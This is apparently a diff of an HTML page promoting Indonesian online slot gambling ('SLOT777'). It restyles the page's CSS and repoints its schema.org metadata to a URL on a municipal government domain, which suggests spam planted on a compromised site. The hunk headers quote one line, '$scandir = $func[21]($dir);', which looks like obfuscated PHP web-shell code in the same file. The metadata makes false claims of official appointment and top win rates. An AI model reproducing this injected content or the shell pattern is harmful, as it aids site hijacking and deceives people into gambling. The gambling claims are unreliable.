+          line-height: 20px
+        }
+  
+        .bank-menu-container {
+          margin: 10px 0 10px 0;
+          display: flex;
+          flex-wrap: wrap;
+          background-color: #000;
+          text-align: center
+        }
+  
+        .bank-menu-container>li {
+          flex-basis: 25%;
+          padding: 0 0 0 10px
+        }
+  
+        .bank-menu-container>li:nth-child(-n+4) {
+          order: 0
+        }
+  
+        .site-description {
+          text-align: left;
+          padding: 10px;
+          color: #e30707;
+          border-radius: 5px;
+          box-shadow: 0 0 8px 4px #e30707
+        }
+  
+        .site-description hr {
+          margin: 10px 0 10px 0;
+          color: #e30707;
+          border: 1px solid #e30707
+        }
+  
+        .site-description p {
+          font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+          font-size: 16px;
+          font-style: normal;
+          font-variant: normal;
+          font-weight: 400;
+          line-height: 23px;
+          padding: 0 10px;
+          color: #fff
+        }
+  
+        .site-description li {
+          margin: 5px 30px 10px;
+          text-align: justify;
+          color: #e30707
+        }
+  
+        .site-description ul>li>a {
+          color: #fff
+        }
+  
+        .site-description a {
+          color: #e30707;
+        }
+  
+        .site-description h1 {
+          font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+          font-size: 2em;
+          font-style: normal;
+          font-variant: normal;
+          font-weight: 500;
+          color: #e30707;
+          margin: 20px 0 20px 0;
+          text-align: center
+        }
+  
+        .site-description h2 {
+          font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+          font-size: 1.5em;
+          font-style: normal;
+          font-variant: normal;
+          font-weight: 500;
+          line-height: 23px;
+          color: #e30707;
+          margin: 20px 0 20px 0;text-align: center
+        }
+  
+        .site-description h3 {
+          font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+          font-size: 1.25em;
+          font-style: normal;
+          font-variant: normal;
+          font-weight: 500;
+          line-height: 23px;
+          color: #e30707;
+          margin: 20px 0 20px 0;
+          padding: 10px 10px 10px 10px
+        }
+  
+        .site-description h4 {
+          font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+          font-size: 1em;
+          font-style: normal;
+          font-variant: normal;
+          font-weight: 500;
+          line-height: 23px;
+          color: #ffffff;
+          margin: 20px 0 20px 0;
+          padding: 10px
+        }
+  
+        .accordion h4 {
+          background-color: transparent;
+          border: 0
+        }
+  
+        .accordion h4 {
+          font-size: 17px;
+          line-height: 28px
+        }
+  
+        .accordion h4 i {
+          height: 40px;
+          line-height: 40px;
+          position: absolute;
+          right: 0;
+          font-size: 12px
+        }
+  
+        #sub_wrapper {
+          background: #685934;
+          max-width: 650px;
+          position: relative;
+          padding: 10px;
+          border-radius: 4px;
+          margin: 20px auto
+        }
+  
+        .tombol_toc {
+          position: relative;
+          outline: 0;
+          font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+          font-size: calc(12px+1vh);
+          font-style: normal;
+          font-variant: normal;
+          font-weight: 300;
+          line-height: 10px;
+          color: #fff
+        }
+  
+        .tombol_toc svg {
+          float: right
+        }
+  
+        #daftarisi {
+          background: #262626;
+          padding: 10px 10px 0;
+          border-radius: 4px;
+          margin-top: 10px;
+          -webkit-box-shadow: 0 2px 15px rgba(0, 0, 0, .05);
+          box-shadow: 0 2px 15px rgba(0, 0, 0, .05);
+          font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+          font-size: calc(8px+1vh);
+          font-style: normal;
+          font-variant: normal;
+          font-weight: 200;
+          line-height: 23px;
+          color: #e30707
+        }
+  
+        #daftarisi a {
+          text-decoration: none;
+          color: #fff
+        }
+  
+        #daftarisi ol {
+          padding: 0 0 0 10px;
+          margin: 0
+        }
+  
+        #daftarisi ol li.lvl1 {
+          line-height: 1.5em;
+          padding: 4px 0
+        }
+  
+        #daftarisi ol li.lvl1:nth-child(n+2) {
+          border-top: 1px dashed #ddd
+        }
+  
+        #daftarisi ol li.lvl1 a {
+          font-weight: 600
+        }
+  
+        #daftarisi ol li.lvl2 a {
+          font-weight: 300;
+          display: block
+        }
+  
+        #daftarisi ul.circle {
+          list-style-type: square;
+          padding: 0 0 0 10px;
+          margin: 0;
+          font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+          font-size: calc(6px+1vh);
+          font-style: normal;
+          font-variant: normal;
+          font-weight: 200
+        }
+  
+        #daftarisi ol li a:hover {
+          text-decoration: underline
+        }
+  
+        :target::before {
+          content: "";
+          display: block;
+          height: 40px;
+          margin-top: -40px;
           visibility: hidden
         }
-
-        .logo {
-          background-color: transparent;
-          justify-content: center;
-          display: block;
-          border-bottom: solid #b700ff 2px;
-          padding: auto;
-          border-radius: 10px;
-          margin-top: 20px
-        }
-
-        .tron-regis {
-          margin: 0 10px 0 0
-        }
-
+  
         .tron-login {
-          margin: 0 10px 0 0
-        }
-      }
-
-      @media screen and (max-width:701px) {
-        .logo {
-          margin-left: 500px;
-          border-bottom: solid #000 2px;
-          display: none
-        }
-
-        .logomobis {
-          background-color: transparent;
-          justify-content: center;
+          -webkit-border-radius: 0;
+          -moz-border-radius: 0;
+          border-radius: 5px;
+          color: #fff;
+          font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+          font-size: calc(12px+1vh);
+          font-style: normal;
+          font-variant: normal;
+          font-weight: 700;
+          line-height: 23px;
+          padding: 10px;
+          background: linear-gradient(to right,#3d0504 0%,#e30707 100%);
+          -webkit-box-shadow: 1px 1px 15px 0 linear-gradient(to right,#3d0504 0%,#e30707 100%);
+          -moz-box-shadow: 1px 1px 15px 0 linear-gradient(to right,#3d0504 0%,#e30707 100%);
+          box-shadow: 1px 1px 15px 0 linear-gradient(to right,#3d0504 0%,#e30707 100%);
+          border: solid #e30707 3px;
+          text-decoration: none;
           display: flex;
-          border-bottom: solid #b700ff 2px;
-          padding: auto;
-          border-radius: 10px
+          cursor: pointer;
+          text-align: center;
+          justify-content: center
         }
-
+  
+        .tron-login:hover {
+          background: linear-gradient(to right,#e30707 0%,#3d0504 100%);
+          border: solid #e30707 1px 1px 15px 0;
+          -webkit-border-radius: 0;
+          -moz-border-radius: 0;
+          border-radius: 0;
+          text-decoration: none;
+          color: #fff
+        }
+  
         .tron-regis {
+          -webkit-border-radius: 0;
+          -moz-border-radius: 0;
+          border-radius: 5px;
+          color: #fff;
+          font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+          font-size: calc(12px+1vh);
+          font-style: normal;
+          font-variant: normal;
+          font-weight: 700;
+          line-height: 23px;
+          padding: 10px;
+          background: linear-gradient(to bottom,#e30707 0%,#e30707 100%);
+          color: #fff;
+          text-decoration: none;
+          display: flex;
+          cursor: pointer;
+          text-align: center;
+          justify-content: center;
           margin: 0 10px 0 0
         }
-
-        .tron-login {
-          margin: 0 10px 0 0
+  
+        .tron-regis:hover {
+          background: #3d0504;
+          border: solid #3d0504 5px;
+          -webkit-border-radius: 0;
+          -moz-border-radius: 0;
+          border-radius: 0;
+          text-decoration: none
         }
-      }
-
-      .updated {
-        border: solid 2px #b700ff;
-        padding: 10px
-      }
-
-      .bsf-rt-reading-time {
-        color: #bfbfbf;
-        font-size: 12px;
-        width: max-content;
-        display: block;
-        min-width: 100px
-      }
-
-      .bsf-rt-display-label:after {
-        content: attr(prefix)
-      }
-
-      .bsf-rt-display-time:after {
-        content: attr(reading_time)
-      }
-
-      .bsf-rt-display-postfix:after {
-        content: attr(postfix)
-      }
-
-      .bonus {
-        width: 88px;
-        height: 102px
-      }
-
-      @media (min-width:768px) {
-        .bonus {
+  
+        .tron {
+          -webkit-border-radius: 0;
+          -moz-border-radius: 0;
+          border-radius: 5px;
+          color: #fff;
+          font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+          font-size: calc(8px+1vh);
+          font-style: normal;
+          font-variant: normal;
+          font-weight: 300;
+          line-height: 15px;
+          padding: 10px;
+          background: linear-gradient(#e30707,#3d0504);
+          -webkit-box-shadow: 1px 1px 10px 0 linear-gradient(#e30707,#3d0504);
+          -moz-box-shadow: 1px 1px 10px 0 linear-gradient(#e30707,#3d0504);
+          box-shadow: 1px 1px 10px 0 linear-gradient(#e30707,#3d0504);
+          border: solid #e30707 2px;
+          text-decoration: none;
+          display: flex;
+          cursor: pointer;
+          text-align: center;
+          justify-content: center;
+          margin: 10px 0 10px 0
+        }
+  
+        .tron:hover {
+          background: linear-gradient(#3d0504,#e30707);;
+          border: solid #e30707 1px 1px 10px 0;
+          -webkit-border-radius: 0;
+          -moz-border-radius: 0;
+          border-radius: 0;
+          text-decoration: none
+        }
+  
+        .tron-images {
+          -webkit-border-radius: 0;
+          -moz-border-radius: 0;
+          border-radius: 5px;
+          color: #e30707;
+          -webkit-box-shadow: 1px 1px 10px 0 #e30707;
+          -moz-box-shadow: 1px 1px 10px 0 #e30707;
+          box-shadow: 1px 1px 10px 0 #e30707;
+          display: block;
+          cursor: pointer;
+          text-align: center;
+          justify-content: center;
+          width: 100%;
+          height: auto;
+          margin-right: auto;
+          margin-left: auto
+        }
+  
+        .tron-images:hover {
+          background: #000;
+          border: solid #e30707 1px;
+          -webkit-border-radius: 0;
+          -moz-border-radius: 0;
+          border-radius: 0
+        }
+  
+        .wa-gift {
+          position: fixed;
           width: 44px;
-          height: 51px
+          display: flex;
+          -webkit-box-align: center;
+          align-items: center;
+          -webkit-box-orient: vertical;
+          -webkit-box-direction: normal;
+          flex-direction: column;
+          -webkit-box-pack: end;
+          justify-content: flex-end;
+          bottom: 160px;
+          right: 20px;
+          z-index: 9
         }
-      }
-
-      @media (min-width:320px) and (max-width:480px) {
-        .main-menu-container>li>a {
-          padding: 18px
+  
+        .wa-livechat {
+          position: fixed;
+          width: 44px;
+          display: flex;
+          -webkit-box-align: center;
+          align-items: center;
+          -webkit-box-orient: vertical;
+          -webkit-box-direction: normal;
+          flex-direction: column;
+          -webkit-box-pack: end;
+          justify-content: flex-end;
+          bottom: 80px;
+          right: 20px;
+          z-index: 9
         }
-      }
-
-      @media (min-width:481px) and (max-width:767px) {
-        .main-menu-container>li>a {
-          padding: 30px
+  
+        .spacer {
+          margin: 0 0 30px 0;
+          display: block
         }
-      }
-
-      p#breadcrumbs {
-        color: #fff;
-        text-align: center
-      }
-
-      .site-description li h4 {
-        color: #fff;
-        line-height: 26px;
-        margin: 5px;
-        padding: 0;
-        text-align: left
-      }
-
-      .tron-regis {
-        animation: blinkings 1s infinite;
-        transition: all .4s;
-        touch-action: manipulation;
-        cursor: pointer
-      }
-
-      .anim {
-        animation: blinkings 1s infinite
-      }
-
-      @keyframes blinkings {
-        0% {
-          border: 2px solid #fff
+  
+        @media screen and (min-width:701px) {
+          .logomobis {
+            margin-left: 500px;
+            display: none;
+            visibility: hidden
+          }
+  
+          .logo {
+            background-color: transparent;
+            justify-content: center;
+            display: block;
+            border-bottom: solid #e30707 2px;
+            padding: auto;
+            border-radius: 10px;
+            margin-top: 20px
+          }
+  
+          .tron-regis {
+            margin: 0 10px 0 0
+          }
+  
+          .tron-login {
+            margin: 0 10px 0 0
+          }
         }
-
-        100% {
-          border: 2px solid #b700ff
+  
+        @media screen and (max-width:701px) {
+          .logo {
+            margin-left: 500px;
+            border-bottom: solid #000 2px;
+            display: none
+          }
+  
+          .logomobis {
+            background-color: transparent;
+            justify-content: center;
+            display: flex;
+            border-bottom: solid #e30707 2px;
+            padding: auto;
+            border-radius: 10px
+          }
+  
+          .tron-regis {
+            margin: 0 10px 0 0
+          }
+  
+          .tron-login {
+            margin: 0 10px 0 0
+          }
         }
-      }
-
-      span.faq-arrow {
-        float: right;
-        color: #fff
-      }
-
-      .fixed-footer {
-        display: flex;
-        justify-content: space-around;
-        position: fixed;
-        background: radial-gradient(circle 214px at 46.5% 54.2%, #b700ff 0, #000 96%);
-        padding: 5px 0;
-        left: 0;
-        right: 0;
-        bottom: 0;
-        z-index: 99
-      }
-
-      .fixed-footer a {
-        flex-basis: calc((100% - 15px*6)/ 5);
-        display: flex;
-        flex-direction: column;
-        justify-content: center;
-        align-items: center;
-        color: #fff;
-        max-width: 75px;
-        font-size: 12px
-      }
-
-      .fixed-footer .center {
-        transform: scale(1.5) translateY(-5px);
-        background: center no-repeat;
-        background-size: contain;
-        background-color: inherit;
-        border-radius: 50%
-      }
-
-      .fixed-footer amp-img {
-        max-width: 30%;
-        margin-bottom: 5px
-      }
-
-      .tidi {
-        -webkit-animation-name: tidi;
-        animation-name: tidi;
-        -webkit-animation-duration: 1s;
-        animation-duration: 1s;
-        -webkit-animation-fill-mode: both;
-        animation-fill-mode: both;
-        animation-iteration-count: infinite
-      }
-
-      @-webkit-keyframes tidi {
-        0% {
-          -webkit-transform: scale3d(1, 1, 1);
-          transform: scale3d(1, 1, 1)
+  
+        .updated {
+          border: solid 2px #e30707;
+          padding: 10px
         }
-
-        10%,
-        20% {
-          -webkit-transform: scale3d(.9, .9, .9) rotate3d(0, 0, 1, -3deg);
-          transform: scale3d(.9, .9, .9) rotate3d(0, 0, 1, -3deg)
+  
+        .bsf-rt-reading-time {
+          color: #bfbfbf;
+          font-size: 12px;
+          width: max-content;
+          display: block;
+          min-width: 100px
         }
-
-        30%,
-        50%,
-        70%,
-        90% {
-          -webkit-transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, 3deg);
-          transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, 3deg)
+  
+        .bsf-rt-display-label:after {
+          content: attr(prefix)
         }
-
-        40%,
-        60%,
-        80% {
-          -webkit-transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, -3deg);
-          transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, -3deg)
+  
+        .bsf-rt-display-time:after {
+          content: attr(reading_time)
         }
-
-        100% {
-          -webkit-transform: scale3d(1, 1, 1);
-          transform: scale3d(1, 1, 1)
+  
+        .bsf-rt-display-postfix:after {
+          content: attr(postfix)
         }
-      }
-
-      @keyframes tidi {
-        0% {
-          -webkit-transform: scale3d(1, 1, 1);
-          transform: scale3d(1, 1, 1)
+  
+        .bonus {
+          width: 88px;
+          height: 102px
         }
-
-        10%,
-        20% {
-          -webkit-transform: scale3d(.9, .9, .9) rotate3d(0, 0, 1, -3deg);
-          transform: scale3d(.9, .9, .9) rotate3d(0, 0, 1, -3deg)
+  
+        @media (min-width:768px) {
+          .bonus {
+            width: 44px;
+            height: 51px
+          }
         }
-
-        30%,
-        50%,
-        70%,
-        90% {
-          -webkit-transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, 3deg);
-          transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, 3deg)
+  
+        @media (min-width:320px) and (max-width:480px) {
+          .main-menu-container>li>a {
+            padding: 18px
+          }
         }
-
-        40%,
-        60%,
-        80% {
-          -webkit-transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, -3deg);
-          transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, -3deg)
+  
+        @media (min-width:481px) and (max-width:767px) {
+          .main-menu-container>li>a {
+            padding: 30px
+          }
         }
-
-        100% {
-          -webkit-transform: scale3d(1, 1, 1);
-          transform: scale3d(1, 1, 1)
+  
+        p#breadcrumbs {
+          color: #fff;
+          text-align: center
         }
-      }
-
-      .wobble {
-        -webkit-animation-name: wobble;
-        animation-name: wobble;
-        -webkit-animation-duration: 1s;
-        animation-duration: 1s;
-        -webkit-animation-fill-mode: both;
-        animation-fill-mode: both;
-        animation-iteration-count: infinite
-      }
-
-      @-webkit-keyframes wobble {
-        0% {
-          -webkit-transform: none;
-          transform: none
+  
+        .site-description li h4 {
+          color: #fff;
+          line-height: 26px;
+          margin: 5px;
+          padding: 0;
+          text-align: left
         }
-
-        15% {
-          -webkit-transform: translate3d(-25%, 0, 0) rotate3d(0, 0, 1, -5deg);
-          transform: translate3d(-25%, 0, 0) rotate3d(0, 0, 1, -5deg)
+  
+        .tron-regis {
+          animation: blinkings 0.5s infinite;
+          transition: all .4s;
+          touch-action: manipulation;
+          cursor: pointer
         }
-
-        30% {
-          -webkit-transform: translate3d(20%, 0, 0) rotate3d(0, 0, 1, 3deg);
-          transform: translate3d(20%, 0, 0) rotate3d(0, 0, 1, 3deg)
+  
+        .anim {
+          animation: blinkings 1s infinite
         }
-
-        45% {
-          -webkit-transform: translate3d(-15%, 0, 0) rotate3d(0, 0, 1, -3deg);
-          transform: translate3d(-15%, 0, 0) rotate3d(0, 0, 1, -3deg)
+  
+        @keyframes blinkings {
+          0% {
+            border: 4px solid #fff
+          }
+  
+          100% {
+            border: 4px solid #e30707
+          }
         }
-
-        60% {
-          -webkit-transform: translate3d(10%, 0, 0) rotate3d(0, 0, 1, 2deg);
-          transform: translate3d(10%, 0, 0) rotate3d(0, 0, 1, 2deg)
+  
+        span.faq-arrow {
+          float: right;
+          color: #e30707
         }
-
-        75% {
-          -webkit-transform: translate3d(-5%, 0, 0) rotate3d(0, 0, 1, -1deg);
-          transform: translate3d(-5%, 0, 0) rotate3d(0, 0, 1, -1deg)
+  
+        .fixed-footer {
+          display: flex;
+          justify-content: space-around;
+          position: fixed;
+          background: linear-gradient(#e30707,#3d0504);
+          padding: 5px 0;
+          left: 0;
+          right: 0;
+          bottom: 0;
+          z-index: 99
         }
-
-        100% {
-          -webkit-transform: none;
-          transform: none
+  
+        .fixed-footer a {
+          flex-basis: calc((100% - 15px*6)/ 5);
+          display: flex;
+          flex-direction: column;
+          justify-content: center;
+          align-items: center;
+          color: #fff;
+          max-width: 75px;
+          font-size: 12px
         }
-      }
-
-      @keyframes wobble {
-        0% {
-          -webkit-transform: none;
-          transform: none
+  
+        .fixed-footer .center {
+          transform: scale(1.5) translateY(-5px);
+          background: center no-repeat;
+          background-size: contain;
+          background-color: inherit;
+          border-radius: 50%
         }
-
-        15% {
-          -webkit-transform: translate3d(-25%, 0, 0) rotate3d(0, 0, 1, -5deg);
-          transform: translate3d(-25%, 0, 0) rotate3d(0, 0, 1, -5deg)
+  
+        .fixed-footer amp-img {
+          max-width: 30%;
+          margin-bottom: 5px
         }
-
-        30% {
-          -webkit-transform: translate3d(20%, 0, 0) rotate3d(0, 0, 1, 3deg);
-          transform: translate3d(20%, 0, 0) rotate3d(0, 0, 1, 3deg)
+  
+        .tada {
+          -webkit-animation-name: tada;
+          animation-name: tada;
+          -webkit-animation-duration: 1s;
+          animation-duration: 1s;
+          -webkit-animation-fill-mode: both;
+          animation-fill-mode: both;
+          animation-iteration-count: infinite
         }
-
-        45% {
-          -webkit-transform: translate3d(-15%, 0, 0) rotate3d(0, 0, 1, -3deg);
-          transform: translate3d(-15%, 0, 0) rotate3d(0, 0, 1, -3deg)
+  
+        @-webkit-keyframes tada {
+          0% {
+            -webkit-transform: scale3d(1, 1, 1);
+            transform: scale3d(1, 1, 1)
+          }
+  
+          10%,
+          20% {
+            -webkit-transform: scale3d(.9, .9, .9) rotate3d(0, 0, 1, -3deg);
+            transform: scale3d(.9, .9, .9) rotate3d(0, 0, 1, -3deg)
+          }
+  
+          30%,
+          50%,
+          70%,
+          90% {
+            -webkit-transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, 3deg);
+            transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, 3deg)
+          }
+  
+          40%,
+          60%,
+          80% {
+            -webkit-transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, -3deg);
+            transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, -3deg)
+          }
+  
+          100% {
+            -webkit-transform: scale3d(1, 1, 1);
+            transform: scale3d(1, 1, 1)
+          }
         }
+  
+        @keyframes tada {
+          0% {
+            -webkit-transform: scale3d(1, 1, 1);
+            transform: scale3d(1, 1, 1)
+          }
+  
+          10%,
+          20% {
+            -webkit-transform: scale3d(.9, .9, .9) rotate3d(0, 0, 1, -3deg);
+            transform: scale3d(.9, .9, .9) rotate3d(0, 0, 1, -3deg)
+          }
+  
+          30%,
+          50%,
+          70%,
+          90% {
+            -webkit-transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, 3deg);
+            transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, 3deg)
+          }
+  
+          40%,
+          60%,
+          80% {
+            -webkit-transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, -3deg);
+            transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, -3deg)
 
-        60% {
-          -webkit-transform: translate3d(10%, 0, 0) rotate3d(0, 0, 1, 2deg);
-          transform: translate3d(10%, 0, 0) rotate3d(0, 0, 1, 2deg)
+          }
+  
+          100% {
+            -webkit-transform: scale3d(1, 1, 1);
+            transform: scale3d(1, 1, 1)
+          }
         }
-
-        75% {
-          -webkit-transform: translate3d(-5%, 0, 0) rotate3d(0, 0, 1, -1deg);
-          transform: translate3d(-5%, 0, 0) rotate3d(0, 0, 1, -1deg)
+  
+        .wobble {
+          -webkit-animation-name: wobble;
+          animation-name: wobble;
+          -webkit-animation-duration: 1s;
+          animation-duration: 1s;
+          -webkit-animation-fill-mode: both;
+          animation-fill-mode: both;
+          animation-iteration-count: infinite
         }
-
-        100% {
-          -webkit-transform: none;
-          transform: none
+  
+        @-webkit-keyframes wobble {
+          0% {
+            -webkit-transform: none;
+            transform: none
+          }
+  
+          15% {
+            -webkit-transform: translate3d(-25%, 0, 0) rotate3d(0, 0, 1, -5deg);
+            transform: translate3d(-25%, 0, 0) rotate3d(0, 0, 1, -5deg)
+          }
+  
+          30% {
+            -webkit-transform: translate3d(20%, 0, 0) rotate3d(0, 0, 1, 3deg);
+            transform: translate3d(20%, 0, 0) rotate3d(0, 0, 1, 3deg)
+          }
+  
+          45% {
+            -webkit-transform: translate3d(-15%, 0, 0) rotate3d(0, 0, 1, -3deg);
+            transform: translate3d(-15%, 0, 0) rotate3d(0, 0, 1, -3deg)
+          }
+  
+          60% {
+            -webkit-transform: translate3d(10%, 0, 0) rotate3d(0, 0, 1, 2deg);
+            transform: translate3d(10%, 0, 0) rotate3d(0, 0, 1, 2deg)
+          }
+  
+          75% {
+            -webkit-transform: translate3d(-5%, 0, 0) rotate3d(0, 0, 1, -1deg);
+            transform: translate3d(-5%, 0, 0) rotate3d(0, 0, 1, -1deg)
+          }
+  
+          100% {
+            -webkit-transform: none;
+            transform: none
+          }
         }
-      }
-
-      .site-description ul li {
-        list-style-type: square
-      }
-    </style>
+  
+        @keyframes wobble {
+          0% {
+            -webkit-transform: none;
+            transform: none
+          }
+  
+          15% {
+            -webkit-transform: translate3d(-25%, 0, 0) rotate3d(0, 0, 1, -5deg);
+            transform: translate3d(-25%, 0, 0) rotate3d(0, 0, 1, -5deg)
+          }
+  
+          30% {
+            -webkit-transform: translate3d(20%, 0, 0) rotate3d(0, 0, 1, 3deg);
+            transform: translate3d(20%, 0, 0) rotate3d(0, 0, 1, 3deg)
+          }
+  
+          45% {
+            -webkit-transform: translate3d(-15%, 0, 0) rotate3d(0, 0, 1, -3deg);
+            transform: translate3d(-15%, 0, 0) rotate3d(0, 0, 1, -3deg)
+          }
+  
+          60% {
+            -webkit-transform: translate3d(10%, 0, 0) rotate3d(0, 0, 1, 2deg);
+            transform: translate3d(10%, 0, 0) rotate3d(0, 0, 1, 2deg)
+          }
+  
+          75% {
+            -webkit-transform: translate3d(-5%, 0, 0) rotate3d(0, 0, 1, -1deg);
+            transform: translate3d(-5%, 0, 0) rotate3d(0, 0, 1, -1deg)
+          }
+  
+          100% {
+            -webkit-transform: none;
+            transform: none
+          }
+        }
+  
+        .site-description ul li {
+          list-style-type: square
+        }
+      </style>
     <script type="application/ld+json">
       {
         "@context": "https://schema.org",
         "@type": "Organization",
-        "name": "slot hoki",
-        "alternateName": "slot hoki",
-        "url": "https://micocar.com/slot-hoki/",
-        "logo": "https://i.ibb.co/hYWG2Fk/slot-hoki.png",
-        "sameAs": "https://micocar.com/slot-hoki/"
+        "name": "SLOT777",
+        "alternateName": "SLOT777",
+        "url": "https://jdih.gunungsitolikota.go.id/slot-gacor/",
+        "logo": "https://i.postimg.cc/J0tmpS3G/slot-gacor.png",
+        "sameAs": "https://jdih.gunungsitolikota.go.id/slot-gacor/"
       }
     </script>
     <script type="application/ld+json">
@@ -2614,26 +1833,26 @@ $scandir = $func[21]($dir);
         "@type": "Article",
         "mainEntityOfPage": {
           "@type": "WebPage",
-          "@id": "https://micocar.com/slot-hoki/"
+          "@id": "https://jdih.gunungsitolikota.go.id/slot-gacor/"
         },
-        "headline": "Slot Hoki: Situs Judi Slot Online Paling Gacor Terbaik Hari Ini",
-        "description": "Slot hoki memberikan pelayanan slot online dengan beraneka ragam permaianan dari provider slot resmi dan terlengkap, daftar segera di situs slot gacor.",
-        "image": ["https://i.ibb.co/hYWG2Fk/slot-hoki.png", "https://i.ibb.co/hYWG2Fk/slot-hoki.png"],
+        "headline": "SLOT777 Link Situs Slot Gacor Hari Ini 2022 Terbaru Auto Maxwin",
+        "description": "SLOT777 Adalah sebuah link situs slot gacor hari ini yang dimana anda bisa memainkan game slot online uang asli untuk mendapatkan slot gacor maxwin di situs slot gacor 2022 terpercaya di Indonesia yaitu SLOT777",
+        "image": ["https://i.postimg.cc/RCJyPq5G/image.png", "https://i.postimg.cc/RCJyPq5G/image.png"],
         "author": {
           "@type": "Organization",
-          "name": "slot hoki",
-          "url": "https://micocar.com/slot-hoki/"
+          "name": "SLOT777",
+          "url": "https://jdih.gunungsitolikota.go.id/slot-gacor/"
         },
         "publisher": {
           "@type": "Organization",
-          "name": "slot hoki",
+          "name": "SLOT777",
           "logo": {
             "@type": "ImageObject",
-            "url": "https://i.ibb.co/hYWG2Fk/slot-hoki.png"
+            "url": "https://i.postimg.cc/J0tmpS3G/slot-gacor.png"
           }
         },
-        "datePublished": "2022-11-12T06:10:17+00:00",
-        "dateModified": "2022-11-12T06:10:17+00:00"
+        "datePublished": "2022-04-02T10:06:51+00:00",
+        "dateModified": "2022-04-02T10:06:51+00:00"
       }
     </script>
     <script type="application/ld+json">
@@ -2644,54 +1863,40 @@ $scandir = $func[21]($dir);
           "@type": "ListItem",
           "position": 1,
           "name": "Home",
-          "item": "https://micocar.com/slot-hoki/"
+          "item": "https://jdih.gunungsitolikota.go.id/slot-gacor/"
         }, {
           "@type": "ListItem",
           "position": 2,
-          "name": "slot hoki",
-          "item": "https://micocar.com/slot-hoki/"
+          "name": "Slot Gacor",
+          "item": "https://jdih.gunungsitolikota.go.id/slot-gacor/"
         }, {
           "@type": "ListItem",
           "position": 3,
-          "name": "Slot hoki: Situs slot gacor Hari Ini 2022-2023"
+          "name": "SLOT777 Link Situs Slot Gacor Hari Ini 2022 Terbaru Auto Maxwin"
         }]
       }
     </script>
     <script type="application/ld+json">
-      {
-        "@context": "http://schema.org",
-        "@type": "VideoObject",
-        "name": "Slot Hoki: Situs Judi Slot Online Paling Gacor Terbaik Hari Ini",
-        "description": "Slot hoki memberikan pelayanan slot online dengan beraneka ragam permaianan dari provider slot resmi dan terlengkap, daftar segera di situs slot gacor.",
-        "thumbnailUrl": "https://i.ytimg.com/vi/N8rvdt9b_a0/hqdefault.jpg",
-        "uploadDate": "2021-08-03T10:13:47Z",
-        "duration": "PT12M17S",
-        "embedUrl": "https://youtu.be/K1svAoYdw8U",
-        "interactionCount": "78"
-      }
-    </script>
-    <script type="application/ld+json">
-      {
-        "@context": "https://schema.org",
-        "@type": "FAQPage",
-        "mainEntity": [{
-          "@type": "Question",
-          "name": "Apa Itu Situs slot hoki",
-          "acceptedAnswer": {
-            "@type": "Answer",
-            "text": "Slot hoki memberikan pelayanan slot online dengan beraneka ragam permaianan dari provider slot resmi dan terlengkap, daftar segera di situs slot gacor terpercaya."
-          }
-        }, {
-          "@type": "Question",
-          "name": "Apa Saja slot hoki?",
-          "acceptedAnswer": {
-            "@type": "Answer",
-            "text": "Kini jaman semakin canggih di tahun 2022 ini Slot Pulsa telah banyak menyediakan permainan yang gampang maxwin dan gacor pastinya seperti :  < ol > < li > Pragmatic Play < /li> < li > Habanero < /li> < li > SpadeGaming < /li> < li > PG Soft < /li> < li > Slot88 < /li> < li > Dan lain - lain < /li> < /ol>
-            "
-          }
-        }]
-      }
-    </script>
+        {
+          "@context": "https://schema.org",
+          "@type": "FAQPage",
+          "mainEntity": [{
+            "@type": "Question",
+            "name": "1. Apa Itu SLOT777?",
+            "acceptedAnswer": {
+              "@type": "Answer",
+              "text": "SLOT777 merupakan Link judi slot online serta slot gacor terlengkap serta terpercaya yang secara formal di tunjuk buat jadi agen judi online terpercaya di Indonesia."
+            }
+          },{
+            "@type": "Question",
+            "name": "2. Apa Link Slot Online Terpercaya di Indonesia?",
+            "acceptedAnswer": {
+              "@type": "Answer",
+              "text": "Link slot online terpercaya di Indonesia tahun 2022 merupakan SLOT777 yang sediakan ratusan sampai ribuan game slot gacor dengan winrate paling tinggi."
+            }
+          }]
+        }
+        </script>
   </head>
   <body>
     <div class="navbar">
@@ -2700,11 +1905,11 @@ $scandir = $func[21]($dir);
           <div class="col-md-12">
             <div class="logomobi acenter">
               <span itemscope="itemscope" itemtype="http://schema.org/Brand">
-                <a itemprop="url" href="https://micocar.com/slot-hoki/" title="slot hoki">
